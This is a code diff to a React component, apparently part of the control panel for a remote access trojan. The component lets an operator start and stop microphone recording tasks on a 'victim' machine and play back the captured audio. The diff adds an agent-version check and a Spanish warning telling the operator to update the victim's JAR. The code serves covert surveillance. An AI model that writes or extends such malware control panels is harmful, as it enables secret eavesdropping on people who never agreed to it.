@@ -5,6 +5,7 @@ import { useApi, mutate } from '@/hooks/useApi';
 import type { Task, Victim } from '@/lib/types';
 import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
+import { versionAtLeast } from '@/lib/actions';
 
 type MicResult = { data?: string; bytes?: number; seconds?: number; mime?: string; device?: string };
 
@@ -18,6 +19,7 @@ export function MicPanel({ victim }: { victim: Victim }) {
   const context = useRef<AudioContext | null>(null);
   const frame = useRef<number | null>(null);
   const { data, refresh } = useApi<{ items: Task[] }>(`/tasks?victim=${victim.id}&limit=30`, { pollMs: 2_000 });
+  const supported = versionAtLeast(victim.agentVersion, '0.4.1');
 
   const tasks = data?.items ?? [];
   const record = tasks.find((task) => task.name === 'mic:record' || task.name === 'mic');
@@ -87,7 +89,7 @@ export function MicPanel({ victim }: { victim: Victim }) {
             <option value="">predeterminado</option>
             {devices.map((item) => <option key={item} value={item}>{item}</option>)}
           </select>
-          {running ? <Button size="sm" variant="destructive" onClick={() => { void mutate(`/tasks/${record!.id}/cancel`, 'POST').catch(() => undefined); }}><CircleStop className="h-3 w-3" /> parar</Button> : <Button size="sm" disabled={!victim.socket || busy} loading={busy} onClick={() => void start()}><Mic className="h-3 w-3" /> grabar</Button>}
+          {running ? <Button size="sm" variant="destructive" onClick={() => { void mutate(`/tasks/${record!.id}/cancel`, 'POST').catch(() => undefined); }}><CircleStop className="h-3 w-3" /> parar</Button> : <Button size="sm" disabled={!victim.socket || !supported || busy} loading={busy} onClick={() => void start()}><Mic className="h-3 w-3" /> grabar</Button>}
         </div>
       </div>
 
@@ -96,6 +98,7 @@ export function MicPanel({ victim }: { victim: Victim }) {
       </div>
 
       {error ? <p className="mt-1 rounded border border-bad/30 bg-bad/10 px-2 py-1 text-2xs text-bad" data-mic-error>{error}</p> : null}
+      {!supported ? <p className="mt-1 text-2xs text-warn">Requiere agente 0.4.1; actualiza el JAR de la víctima.</p> : null}
       {result?.data ? (
         <div className="mt-1.5 space-y-1">
           <audio ref={audio} controls src={`data:${result.mime ?? 'audio/webm'};base64,${result.data}`} className="h-8 w-full" data-mic-player />
